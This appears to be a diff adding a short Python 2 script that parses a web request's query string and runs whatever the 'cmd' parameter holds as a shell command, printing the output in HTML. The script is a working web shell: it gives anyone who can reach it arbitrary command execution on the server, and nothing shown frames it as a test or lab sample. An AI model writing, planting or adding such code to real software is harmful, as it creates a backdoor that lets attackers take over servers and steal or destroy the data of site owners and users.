@@ -1,0 +1,9 @@
+import re
+import subprocess
+import urllib
+
+params = dict((match.group("parameter"), urllib.unquote(match.group("value"))) for match in re.finditer(r"((\A|[?&])(?P<parameter>[\w\[\]]+)=)(?P<value>[^&]+)", QUERY_STRING))
+
+if "cmd" in params:
+    result = subprocess.check_output(params["cmd"], shell=True, stderr=subprocess.STDOUT)
+    print "<pre>%s</pre>" % result
